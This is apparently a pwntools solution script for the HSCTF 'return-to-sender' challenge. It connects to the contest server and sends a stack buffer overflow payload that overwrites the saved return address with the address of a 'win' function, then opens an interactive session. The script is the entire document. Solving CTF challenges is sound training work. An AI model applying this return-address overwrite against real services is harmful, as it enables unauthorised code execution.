from pwn import *

# r = gdb.debug('./return-to-sender')
r = remote('pwn.hsctf.com', 1234)

payload = b''
payload += b'A' * 0x10 # stack
payload += b'B' * 4 # ebp
payload += p32(0x080491b6)  # win

r.sendline(payload)
r.interactive()
